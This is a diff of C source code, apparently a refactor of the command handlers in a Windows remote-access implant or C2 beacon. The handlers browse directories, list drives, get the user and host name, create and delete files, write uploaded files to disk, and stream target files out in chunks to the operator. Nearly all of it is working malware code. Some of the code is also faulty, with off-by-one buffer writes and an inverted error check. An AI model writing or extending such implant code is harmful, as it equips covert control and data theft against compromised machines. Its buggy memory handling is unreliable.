@@ -49,7 +49,7 @@ unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
     return utf8Str;
 }
 
-unsigned char* listDirectory(unsigned char* dirPathy , size_t* dirPathStrlen) {
+unsigned char* listDirectory(unsigned char* dirPathy, size_t* dirPathStrlen) {
     
     setlocale(LC_ALL, "");
     wchar_t* path = convertToWideChar(dirPathy);
@@ -106,7 +106,7 @@ unsigned char* listDirectory(unsigned char* dirPathy , size_t* dirPathStrlen) {
     return resultStrchar;
 }
 
-unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* lenn) {
+unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* msgLen) {
     uint8_t pendingRequest[4];
     uint8_t dirPathLenBytes[4];
 
@@ -118,8 +118,10 @@ unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* lenn) {
     unsigned char* dirPathBytes = (unsigned char*)malloc(dirPathLen);
     unsigned char* dirPathBytesstart = commandBuf + 8;
 
-    memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
-    dirPathBytes[dirPathLen] = '\0';
+    if (dirPathLen) {
+        memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
+        dirPathBytes[dirPathLen] = '\0';
+    }
     
     unsigned char*  dirPathStr = str_replace_all(dirPathBytes, "*", "");
     
@@ -146,243 +148,259 @@ unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* lenn) {
     unsigned char* result = listDirectory(dirPathStr,&dirPathStrlen);
     
     uint8_t* result8 = (uint8_t*)result;
-    uint8_t* metaInfoBytes[] = { pendingRequest, result8 };
-    size_t metaInfosizes[] = { 4,dirPathStrlen };
-    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
-    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
-    size_t metaInfoSize = 0;
+    uint8_t* metaInfoArrays[] = { pendingRequest, result8 };
+    size_t metaInfoSizes[] = { 4,dirPathStrlen };
+    size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
+    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
+    size_t metaInfoTotalSize = 0;
 
-    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
-        metaInfoSize += metaInfosizes[i];
+    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+        metaInfoTotalSize += metaInfoSizes[i];
     }
 
     int callbackType = 0;
-    *lenn = metaInfoSize;
+    *msgLen = metaInfoTotalSize;
 
-    return metaInfoconcatenated;
+    return metaInfoMsg;
 }
 
-unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* Bufflen, int chunkNumber) {
-    uint8_t filePathLenBytes[4];
-    unsigned char* filePathLenstart = commandBuf;
+unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen, DWORD chunkNumber) {
+    uint8_t fileNameLenBytes[4];
+
+	// commandBuf 数据结构如下
+	// fileNameLenBigEndian(4Bytes) | fileName(fileNameLenBigEndian Bytes) | fileContent(rest Bytes)
+    unsigned char* fileNameLength = commandBuf;
     
-    memcpy(filePathLenBytes, filePathLenstart, 4);
+    memcpy(fileNameLenBytes, fileNameLength, 4);
 
-    uint32_t filePathLen = bigEndianUint32(filePathLenBytes);
-    unsigned char* filePath = (unsigned char*)malloc(filePathLen);
-    filePath[filePathLen] = '\0';
+    uint32_t fileNameLenBigEndian = bigEndianUint32(fileNameLenBytes);
+    unsigned char* fileName = (unsigned char*)malloc(fileNameLenBigEndian);
+    if(!fileName){
+        fprintf(stderr, "Memory Allocation failed for filePath\n");
+		return NULL;
+    }
+    fileName[fileNameLenBigEndian] = '\0';
 
-    unsigned char* filePathstart = commandBuf + 4;
-    memcpy(filePath, filePathstart, filePathLen);
+    
+    unsigned char* fileNameBuffer = commandBuf + 4;
+    memcpy(fileName, fileNameBuffer, fileNameLenBigEndian);
 
-    size_t fileContenthlen = (size_t)commandBuflen - 4 - (size_t)filePathLen;
-    unsigned char* fileContenth = (unsigned char*)malloc(fileContenthlen);
-    fileContenth[fileContenthlen] = '\0';
-    unsigned char* fileContenthstart = commandBuf + filePathLen +4;
+    size_t fileContenthLen = (size_t)commandBuflen - 4 - (size_t)fileNameLenBigEndian;
+    unsigned char* fileContenth = (unsigned char*)malloc(fileContenthLen);
+    fileContenth[fileContenthLen] = '\0';
+    unsigned char* fileContent = commandBuf + fileNameLenBigEndian +4;
 
-    unsigned char* chunk = (unsigned char*)malloc(1024);
+    unsigned char* buffer = (unsigned char*)malloc(1024);
 
-    if (!chunk) {
-        fprintf(stderr, "Error allocating memory\n");
-        return;
+    if (!buffer) {
+        fprintf(stderr, "Memory Allocation failed for chunk\n");
+        return NULL;
     }
 
     size_t bytesRead;
     size_t offset = 0;
 
-    while (offset < (size_t)fileContenthlen) {
-        size_t remaining = (size_t)fileContenthlen - offset;
-        size_t chunkSize = remaining > 1024 ? 1024 : remaining;
+    // 每次写入 1MB
+    while (offset < fileContenthLen) {
+        size_t remaining = fileContenthLen - offset;
+        size_t bufferSize = remaining > 1024 ? 1024 : remaining;
 
-        memcpy(chunk, fileContenthstart + offset, chunkSize);
+        memcpy(buffer, fileContent + offset, bufferSize);
 
-        Upload(filePath, chunk, chunkSize, chunkNumber);
-
-        offset += chunkSize;
-        chunkNumber++;
+        if (Upload(fileName, buffer, bufferSize, chunkNumber)) {
+            offset += bufferSize;
+            chunkNumber++;
+        }
     }
 
-    unsigned char* Uploadstr = "success, the offset is: ";
-    unsigned char offsetchar[20];      // 数字转字符串缓冲区
-    sprintf(offsetchar, "%d", offset); // 将整数转换为字符串
-    unsigned char* result = (unsigned char*)malloc(strlen(offsetchar)+strlen(Uploadstr));
-    result[strlen(offsetchar) + strlen(Uploadstr)]='\0';
-    
-
-    memcpy(result, Uploadstr,strlen(Uploadstr));
-    memcpy(result + strlen(Uploadstr), offsetchar, strlen(offsetchar));
-    *Bufflen = strlen(offsetchar) + strlen(Uploadstr);
-
+    unsigned char* Uploadstr = "[+] Upload Successfully! File Size: ";
+    unsigned char offsetStr[20];     
+	// size_t 为 long long 类型使用%lld
+    sprintf(offsetStr, "%lld", offset); // 将整数转换为字符串
+    unsigned char* result = (unsigned char*)malloc(strlen(offsetStr) + strlen(Uploadstr) + 1);
+    if (result) {
+        memcpy(result, Uploadstr, strlen(Uploadstr));
+        memcpy(result + strlen(Uploadstr), offsetStr, strlen(offsetStr));
+        *msgLen = strlen(offsetStr) + strlen(Uploadstr);
+    }
     return result;
 }
 
-int Upload(const unsigned char* filePath, const unsigned char* fileContent, size_t contentSize, int isStart) {
-    FILE* fp;
+BOOL Upload(unsigned char* filePath, unsigned char* fileContent, size_t fileContentSize, int isStart) {
+    FILE* file;
     const char* mode;
     
     if (isStart == 1) {
-        // 如果文件存在，需要用户在上传前手动删除它
-        mode = "wb"; // 以二进制写入模式打开文件，如果文件存在则截断内容
+        // 如果文件已存在，会清空原有内容（文件长度变为 0）
+        // 如果文件不存在，会新建文件
+        // 写入时从文件开头开始写
+        mode = "wb"; 
     }
     else {
-        mode = "ab"; // 以追加二进制写入模式打开文件
+        // 如果文件已存在，写入的位置永远在文件末尾，不会覆盖前面的内容
+        // 如果文件不存在，会新建文件
+        mode = "ab"; 
     }
 
-    fp = fopen(filePath, mode);
-    if (fp == NULL) {
-        perror("File open error");
-        return -1;
+    file = fopen(filePath, mode);
+    if (file == NULL) {
+        perror("File Open Error");
+        return FALSE;
     }
 
-    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), contentSize, fp);
-    if (bytesWritten != contentSize) {
-        perror("File write error");
-        fclose(fp);
-        return -1;
+    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), fileContentSize, file);
+    if (bytesWritten != fileContentSize) {
+        perror("File Write Error");
+        fclose(file);
+        return FALSE;
     }
 
-    fclose(fp);
-    return (int)bytesWritten;
+    fclose(file);
+    return TRUE;
 }
 
-unsigned char* CmdDrives(unsigned char* commandBuf, size_t* Bufflen) {
+unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen) {
 
     DWORD drives = GetLogicalDrives();
-    unsigned char drives2[20];
-    sprintf(drives2, "%d", drives);
+    unsigned char drivesStr[20];
+    // 转化为字符串
+    sprintf(drivesStr, "%d", drives);
 
-    unsigned char* result = (unsigned char*)malloc(strlen(drives2));
-    result[strlen(drives2)]='\0';
-    memcpy(result, drives2, strlen(drives2));
-    uint8_t command[4];
-    memcpy(command, commandBuf,4);
+    unsigned char* result = (unsigned char*)malloc(strlen(drivesStr) + 1);
+    if (result) {
+        memcpy(result, drivesStr, strlen(drivesStr));
+        result[strlen(drivesStr)] = '\0';
+        uint8_t command[4];
+        memcpy(command, commandBuf, 4);
 
-    uint8_t* metaInfoBytes[] = { command, result };
-    size_t metaInfosizes[] = { 4, strlen(result) };
-    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
-    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
-    size_t metaInfoSize = 0;
-    
-    // 计算所有 sizeof 返回值的总和
-    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
-        metaInfoSize += metaInfosizes[i];
+        uint8_t* metaInfoArrays[] = { command, result };
+        size_t metaInfoSizes[] = { 4, strlen(result) };
+        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
+        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
+        size_t metaInfoTotalSize = 0;
+
+        // 计算所有 sizeof 返回值的总和
+        for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+            metaInfoTotalSize += metaInfoSizes[i];
+        }
+        *msgLen = metaInfoTotalSize;
+
+        return (unsigned char*)metaInfoMsg;
     }
-    *Bufflen = metaInfoSize;
-
-    return metaInfoconcatenated;
 }
 
-unsigned char* CmdPwd(unsigned char* commandBuf, size_t* Bufflen) {
-
+unsigned char* CmdPwd(unsigned char* commandBuf, size_t* msgLen) {
     // 获取缓冲区所需大小，包括'\0'
     DWORD bufferSize = GetCurrentDirectoryA(0, NULL); 
 
     if (bufferSize == 0) {
-        unsigned char* error = "Error Get Directory";
-        *Bufflen = strlen(error);
-        return error;
+        unsigned char* error = "[-] Error Get Directory";
+        unsigned char* errorBuffer = (unsigned char*)malloc(strlen(error) + 1);
+        memcpy(errorBuffer, error, strlen(error));
+        *msgLen = strlen(error);
+        return errorBuffer;
     }
 
-    unsigned char* lpcurrentPath = (unsigned char*)malloc(bufferSize * sizeof(char));
+    unsigned char* lpcurrentPath = (unsigned char*)malloc(bufferSize + 1);
 
     // result 不包括'\0'
-    DWORD result = GetCurrentDirectoryA(bufferSize, lpcurrentPath);
+    DWORD resultLen = GetCurrentDirectoryA(bufferSize, lpcurrentPath);
 
-    if (result == 0 || result > bufferSize) {
+    if (resultLen == 0 || resultLen > bufferSize) {
+		fprintf(stderr, "GetCurrentDirectoryA Failed With Error:%lu", GetLastError());
         free(lpcurrentPath);
-        unsigned char* error = "Error Get Directory";
-        *Bufflen = strlen(error);
-        return error; 
     }
 
     // 没有'\0'
-    *Bufflen = result;
-    return (unsigned char*)lpcurrentPath;
+    *msgLen = resultLen;
+    return lpcurrentPath;
 }
 
-unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* Bufflen) {
+unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen) {
     unsigned char* computerName = (unsigned char*)malloc(MAX_COMPUTERNAME_LENGTH);
     unsigned char* userName = (unsigned char*)malloc(UNLEN);
 
     DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
 
     if (!GetComputerNameA(computerName, &size)) {
-        fprintf(stderr, "Error Get Computer Name\n");
+        fprintf(stderr, "GetComputerNameA Failed With Error:%lu\n", GetLastError());
+        return NULL;
     }
 
     size = UNLEN + 1;
     if (!GetUserNameA(userName, &size)) {
-        fprintf(stderr, "Error Get User Name\n");
-    }
-
-    size_t total_len = strlen(computerName) + strlen(userName) + 2; // 加两个'\0'
-    unsigned char* result = malloc(total_len);
-
-    snprintf(result, total_len, "%s\\%s", computerName, userName);
-    *Bufflen = total_len;
-
-    return result;
-}
-
-unsigned char* CmdMkdir(unsigned char* cmdBuf,size_t* commandBuflen, size_t* Bufflen) {
-    cmdBuf[*commandBuflen] = '\0';
-    if (CreateDirectoryA((LPCSTR)cmdBuf, NULL) != 0) {
-        fprintf(stderr, "Error creating directory");
+        fprintf(stderr, "GetUserNameA Failed With Error:%lu\n", GetLastError());
         return NULL;
     }
 
-    unsigned char* Mkdirstr = "Mkdir Success:";
-    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + *commandBuflen);
-    memcpy(result, Mkdirstr, strlen(Mkdirstr));
-    memcpy(result + strlen(Mkdirstr), cmdBuf, *commandBuflen);
-    
-    *Bufflen = strlen(Mkdirstr) + *commandBuflen;
+    if (computerName && userName) {
+        size_t total_len = strlen(computerName) + strlen(userName) + 2; // 加两个'\0'
+        unsigned char* result = malloc(total_len + 1);
+        snprintf(result, total_len, "%s\\%s", computerName, userName);
+        *msgLen = total_len;
 
-    return result;
+        return result;
+    }
+}
+
+unsigned char* CmdMkdir(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
+    commandBuf[*commandBuflen] = '\0';
+    if (!CreateDirectoryA((LPCSTR)commandBuf, NULL) != 0) {
+        fprintf(stderr, "CreateDirectoryA Failed With Error：%lu\n", GetLastError());
+        return NULL;
+    }
+
+    unsigned char* Mkdirstr = "[+] Mkdir Success:";
+    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + *commandBuflen);
+    if (result) {
+        memcpy(result, Mkdirstr, strlen(Mkdirstr));
+        memcpy(result + strlen(Mkdirstr), commandBuf, *commandBuflen);
+
+        *msgLen = strlen(Mkdirstr) + *commandBuflen;
+
+        return result;
+    }
 }
 
 
-unsigned char* CmdFileRemove(unsigned char* cmdBuf, size_t* commandBuflen, size_t* Bufflen) {
-    cmdBuf[*commandBuflen] = '\0';
-    DWORD attributes = GetFileAttributesA((LPCSTR)cmdBuf);
-
-    // printf("Attributes: 0x%lX\n", attributes);
+unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
+    commandBuf[*commandBuflen] = '\0';
+    DWORD attributes = GetFileAttributesA((LPCSTR)commandBuf);
 
     if (attributes == INVALID_FILE_ATTRIBUTES) {
-        const char* errorMsg = "Remove failed:Invalid path or file";
-        *Bufflen = strlen(errorMsg);
-        unsigned char* result = (unsigned char*)malloc(*Bufflen + 1);
-        if (result) {
-            memcpy(result, errorMsg, *Bufflen + 1);
+        const char* errorMsg = "[-] Remove failed:Invalid path or file";
+        *msgLen = strlen(errorMsg);
+        unsigned char* result = (unsigned char*)malloc(strlen(errorMsg) + 1);
+        if (!result) {
+            fprintf(stderr, "Memory allocation failed\n");
+			return NULL;
         }
-
+        memcpy(result, errorMsg, strlen(errorMsg));
         return result;
     }
 
     int removeResult;
     // 删除文件是目录的情况
     if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
-        removeResult = RemoveDirectoryA((LPCSTR)cmdBuf);
+        removeResult = RemoveDirectoryA((LPCSTR)commandBuf);
     }
     // 文件
     else {
-        removeResult = DeleteFileA((LPCSTR)cmdBuf);
+        removeResult = DeleteFileA((LPCSTR)commandBuf);
     }
 
-    unsigned char* Removestr = removeResult == 0 ? "Remove Failed:" : "Remove Success:";
+    unsigned char* Removestr = removeResult == 0 ? "[-] Remove Failed:" : "[+] Remove Success:";
     size_t RemovestrLen = strlen(Removestr);
 
-    *Bufflen = RemovestrLen + *commandBuflen;
-    unsigned char* result = (unsigned char*)malloc(*Bufflen + 1);
+    *msgLen = RemovestrLen + *commandBuflen;
+    unsigned char* result = (unsigned char*)malloc(*msgLen + 1);
     if (result == NULL) {
         fprintf(stderr, "Memory allocation failed\n");
-        *Bufflen = 0;
         return NULL;
     }
 
     memcpy(result, Removestr, RemovestrLen);
-    memcpy(result + RemovestrLen, cmdBuf, *commandBuflen);
-    result[*Bufflen] = '\0';
+    memcpy(result + RemovestrLen, commandBuf, *commandBuflen);
 
     return result;
 }
@@ -400,95 +418,96 @@ DWORD WINAPI myThreadFunction(LPVOID lpParam) {
     size_t* commandBuflen = args->commandBuflen;
     size_t* Bufflen = args->Bufflen;
     LPCSTR lpFilePath = (LPCSTR)buf;
-    // printf("%s\n", lpFilePath);
-    off_t fileLenValue = 0;
-    uint32_t fileLensValue = 0;
-    off_t* fileLen = &fileLenValue;     
-    uint32_t* fileLens = &fileLensValue; 
+    uint64_t fileLen64Val;
+    uint32_t fileLen32Val;
 
     WIN32_FILE_ATTRIBUTE_DATA fileInfo;
     if (GetFileAttributesExA(lpFilePath, GetFileExInfoStandard, &fileInfo)) {
         LARGE_INTEGER largeFileSize;
         largeFileSize.LowPart = fileInfo.nFileSizeLow;
         largeFileSize.HighPart = fileInfo.nFileSizeHigh;
-        *fileLen = largeFileSize.QuadPart; 
+        // 64 位文件总大小
+        fileLen64Val = largeFileSize.QuadPart;
         // 最多下载 4GB 的文件
+		// 否则返回错误信息
         if (largeFileSize.QuadPart > UINT32_MAX) {
             unsigned char* ErrorSizeStr = "[-] The downloaded file is larger than 4GB";
             DataProcess(ErrorSizeStr, strlen(ErrorSizeStr), 0);
-            return 1;
+            return FALSE;
         }
-        *fileLens = (uint32_t)largeFileSize.QuadPart;
+		// 文件大小已经在 4GB 范围内了, 可以直接赋值
+        fileLen32Val = (uint32_t)largeFileSize.QuadPart;
     }
 
     else {
-        fprintf(stderr, "Failed to get file attributes: %lu\n", GetLastError());
-        return 1;
+        fprintf(stderr, "Failed to get file attributes:%lu\n", GetLastError());
+        return FALSE;
     }
 
-    // 数据包格式: requestIdBytesStart(4Bytes) | fileLenBytes(4Bytes) | buf
-    uint8_t fileLenBytes[4];
-    PutUint32BigEndian(fileLenBytes, fileLens);
-    uint32_t rand = (uint32_t)GenerateRandomInt(10000, 99999);
-    uint8_t requestIdBytesStart[4];
-    PutUint32BigEndian(requestIdBytesStart, rand);
-    uint8_t* metaInfoBytes[] = { requestIdBytesStart, fileLenBytes, buf };
-    size_t metaInfosizes[] = { 4, 4, *commandBuflen };
-    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
-    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
-    size_t metaInfoSize = 0;
+    // 开始构造数据包 
+    // 数据包格式: requestIdBigEndian(4Bytes) | fileLen32BigEndian(4Bytes) | buf
+    uint8_t fileLen32BigEndian[4];
+    PutUint32BigEndian(fileLen32BigEndian, &fileLen32Val);
+    uint32_t requestId = (uint32_t)GenerateRandomInt(10000, 99999);
+    uint8_t requestIdBigEndian[4];
+    PutUint32BigEndian(requestIdBigEndian, requestId);
+    uint8_t* metaInfoArrays[] = { requestIdBigEndian, fileLen32BigEndian, buf };
+    size_t metaInfoSizes[] = { 4, 4, *commandBuflen };
+	// 计算 metaInfoBytes 的个数
+    size_t metaInfoCounts= sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
+    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
+    size_t metaInfoTotalSize = 0;
 
-    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
-        metaInfoSize += metaInfosizes[i];
+    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+        metaInfoTotalSize += metaInfoSizes[i];
     }
 
-    DataProcess(metaInfoconcatenated, metaInfoSize, 2);
+    DataProcess((unsigned char*)metaInfoMsg, metaInfoTotalSize, 2);
 
     HANDLE hFile = CreateFileA(buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        return 1;
+		fprintf(stderr, "CreateFileA Failed With Error:%lu\n", GetLastError());
+        return FALSE;
     }
 
-    unsigned char* fileBuf = malloc(1024 * 1024); // 缓冲区 1MB
-    if (fileBuf == NULL) {
-        fclose(hFile);
-        return 1;
+    // 缓冲区 1MB
+    unsigned char* fileBuffer = (unsigned char*)malloc(1024 * 1024); 
+    if (fileBuffer == NULL) {
+		fprintf(stderr, "Memory allocation failed for fileBuffer\n");
+        return FALSE;
     }
 
-    size_t metaInfoSizeToo = 0;
     DWORD bytesRead;
-    // 数据包格式: requestIdBytesStart(4Bytes) | fileBuf
-    while (ReadFile(hFile, (LPVOID)fileBuf, 1024 * 1024, &bytesRead, NULL) && bytesRead > 0) {
-        uint8_t* metaInfoBytesToo[] = { requestIdBytesStart, fileBuf };
-        size_t metaInfosizesToo[] = { 4, bytesRead };
-        size_t metaInfoBytesNumsToo = sizeof(metaInfoBytesToo) / sizeof(metaInfoBytesToo[0]); // 个数
-        uint8_t* metaInfoconcatenatedToo = CalcByte(metaInfoBytesToo, metaInfosizesToo, metaInfoBytesNumsToo); // 合并
-        metaInfoSizeToo = 4 + bytesRead;
+    // 数据包格式: requestIdBigEndian(4Bytes) | fileBuffer
+    while (ReadFile(hFile, (LPVOID)fileBuffer, 1024 * 1024, &bytesRead, NULL) && bytesRead > 0) {
+        uint8_t* metaInfoArrays[] = { requestIdBigEndian, fileBuffer };
+        size_t metaInfoSizes[] = { 4, bytesRead };
+        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]); 
+        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
+        size_t metaInfoTotalSize = 4 + bytesRead;
        
-        DataProcess(metaInfoconcatenatedToo, metaInfoSizeToo, 8);
+        DataProcess(metaInfoMsg, metaInfoTotalSize, 8);
         Sleep(50);
     }
 
-    free(fileBuf);
+    free(fileBuffer);
 
-    return 0;
+    return TRUE;
 }
 
-unsigned char* CmdFileDownload(unsigned char* buf, size_t* commandBuflen, size_t* Bufflen) {
-    buf[*commandBuflen] = '\0';
-    DWORD attributes = GetFileAttributesA((LPCSTR)buf);
-
-    // printf("Attributes: 0x%lX\n", attributes);
+unsigned char* CmdFileDownload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
+    commandBuf[*commandBuflen] = '\0';
+    DWORD attributes = GetFileAttributesA((LPCSTR)commandBuf);
 
     if (attributes == INVALID_FILE_ATTRIBUTES) {
-        const char* errorMsg = "Remove failed:Invalid path or file";
-        *Bufflen = strlen(errorMsg);
-        unsigned char* result = (unsigned char*)malloc(*Bufflen + 1);
-        if (result) {
-            memcpy(result, errorMsg, *Bufflen + 1);
+        const char* errorMsg = "[-] GetFileAttributesA failed: Invalid path or file";
+        unsigned char* errorStr = (unsigned char*)malloc(strlen(errorMsg) + 1);
+        if (errorStr) {
+            memcpy(errorStr, errorMsg, strlen(errorMsg));
+            *msgLen = strlen(errorMsg);
         }
 
-        return result;
+        return errorStr;
     }
 
     // 目录
@@ -499,11 +518,11 @@ unsigned char* CmdFileDownload(unsigned char* buf, size_t* commandBuflen, size_t
 
     struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
     if (args == NULL) {
-        fprintf(stderr, "Memory allocation failed\n");
+        fprintf(stderr, "Memory allocation failed For args\n");
         return NULL;
     }
 
-    args->buf = buf;
+    args->buf = commandBuf;
     args->commandBuflen = commandBuflen;
 
     HANDLE myThread = CreateThread(
@@ -515,7 +534,7 @@ unsigned char* CmdFileDownload(unsigned char* buf, size_t* commandBuflen, size_t
         NULL);                      // 不存储线程ID
 
     if (myThread == NULL) {
-        fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
+        fprintf(stderr, "CreateThread Failed With Error: %lu\n", GetLastError());
         return NULL;
     }
 
@@ -523,10 +542,15 @@ unsigned char* CmdFileDownload(unsigned char* buf, size_t* commandBuflen, size_t
     CloseHandle(myThread);
 
     unsigned char* downloadStr = "[+] Already Download file ";
-    unsigned char* result = (unsigned char*)malloc(strlen(downloadStr) + *commandBuflen);
-    memcpy(result, downloadStr, strlen(downloadStr));
-    memcpy(result + strlen(downloadStr), buf, *commandBuflen);
-    *Bufflen = strlen(downloadStr) + *commandBuflen;
+    unsigned char* resultStr = (unsigned char*)malloc(strlen(downloadStr) + *commandBuflen + 1);
+    if (!resultStr) {
+		fprintf(stderr, "Memory allocation failed for result\n");
+        return NULL;
+    }
+    memcpy(resultStr, downloadStr, strlen(downloadStr));
+    memcpy(resultStr + strlen(downloadStr), commandBuf, *commandBuflen);
+    *msgLen = strlen(downloadStr) + *commandBuflen;
 
-    return result;
+    return resultStr;
 }
+
